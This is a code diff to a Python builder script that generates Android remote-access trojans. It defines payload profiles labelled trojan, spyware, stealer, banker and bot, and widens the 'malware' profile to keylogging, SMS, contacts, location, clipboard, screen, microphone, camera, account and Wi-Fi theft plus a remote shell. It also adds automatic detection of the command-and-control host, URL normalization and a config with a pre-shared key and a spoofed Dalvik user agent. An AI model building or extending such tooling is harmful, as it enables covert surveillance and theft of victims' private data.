@@ -21,6 +21,7 @@ import json
 import os
 import re
 import shutil
+import socket
 import subprocess
 import sys
 import time
@@ -34,6 +35,8 @@ TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templat
 MIN_SDK = 21
 TARGET_SDK = 35
 BUILD_TIMEOUT = 1800
+DEFAULT_PORT = 8443
+AUTO_HOSTS = ("", "auto", "smart", "lan", "detect", "local", "-")
 
 
 class BuildError(Exception):
@@ -52,7 +55,9 @@ SPECS: Dict[str, List[str]] = {
     "trojan": ["keylog", "sms", "calls", "contacts", "loc", "notif",
                "files", "shell", "apps", "native"],
     "spyware": ["keylog", "notif", "loc", "clip", "screen", "mic", "usage", "native"],
-    "malware": ["sms", "calls", "shell", "files", "apps", "keylog", "native"],
+    "malware": ["keylog", "sms", "calls", "contacts", "loc", "notif", "clip",
+                "files", "shell", "apps", "wifi", "accounts", "usage", "screen",
+                "mic", "cam", "native"],
     "stealer": ["sms", "calls", "contacts", "accounts", "wifi", "files", "apps"],
     "banker": ["keylog", "notif", "clip", "apps", "screen"],
     "bot": ["shell", "files", "apps", "native"],
@@ -96,7 +101,7 @@ SDK_HELP = (
 
 
 def _sdk_root(bootstrap: bool = False) -> str:
-    found = sdk_tools.find()
+    found = sdk_tools.find() or sdk_tools.first_root()
     if found:
         os.environ.setdefault("ANDROID_HOME", found)
         os.environ.setdefault("ANDROID_SDK_ROOT", found)
@@ -404,6 +409,60 @@ def build_with_gradle(work: str, tc: Toolchain, release: bool) -> str:
     return found[-1]
 
 
+def detect_lan() -> str:
+    """Best-effort primary LAN address — no packet is actually sent."""
+    for probe in ("8.8.8.8", "1.1.1.1"):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            sock.connect((probe, 80))
+            address = sock.getsockname()[0]
+            if address and not address.startswith("127."):
+                return address
+        except OSError:
+            continue
+        finally:
+            sock.close()
+    try:
+        for _, address in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
+            if not address.startswith("127."):
+                return address
+    except OSError:
+        pass
+    return "127.0.0.1"
+
+
+def normalize_host(raw: str, port: Optional[int] = None) -> str:
+    """Accept ``host``, ``host:port``, full URL or ``auto``; return a URL."""
+    from urllib.parse import urlparse
+
+    text = (raw or "").strip().rstrip("/")
+    if text.lower() in AUTO_HOSTS:
+        port = port or int(os.environ.get("HACKIT_RAT_PORT") or DEFAULT_PORT)
+        return f"http://{detect_lan()}:{port}"
+    bare = "://" not in text
+    if bare:
+        text = "http://" + text
+    parsed = urlparse(text)
+    if parsed.scheme not in ("http", "https") or not parsed.hostname:
+        raise BuildError(f"host not understood: {raw!r} (use auto, host, host:port or a URL)")
+    if parsed.port is not None:
+        port_value = parsed.port
+    elif port is not None:
+        port_value = port
+    elif bare:
+        port_value = int(os.environ.get("HACKIT_RAT_PORT") or DEFAULT_PORT)
+    else:
+        port_value = 443 if parsed.scheme == "https" else 80
+    netloc = parsed.hostname
+    if ":" in netloc and not netloc.startswith("["):
+        netloc = f"[{netloc}]"
+    if parsed.username:
+        auth = parsed.username + ((":" + parsed.password) if parsed.password else "") + "@"
+    else:
+        auth = ""
+    return f"{parsed.scheme}://{auth}{netloc}:{port_value}{parsed.path.rstrip('/')}"
+
+
 def make_config(
     host: str,
     psk_b64: str,
@@ -421,8 +480,7 @@ def make_config(
         raise BuildError(f"psk is not valid base64: {exc}") from exc
     if len(raw) != 32:
         raise BuildError(f"psk must decode to 32 bytes, got {len(raw)}")
-    if not host.startswith(("http://", "https://")):
-        raise BuildError("host must start with http:// or https://")
+    host = normalize_host(host)
     from urllib.parse import urlparse
 
     parsed = urlparse(host)
@@ -444,7 +502,7 @@ def make_config(
         "min_sdk": MIN_SDK,
         "target_sdk": TARGET_SDK,
         "user_agent": "Dalvik/2.1.0 (Linux; U; Android)",
-        "native_port": base_port + 100,
+        "native_port": min(65535, base_port + 100),
     }
 
 
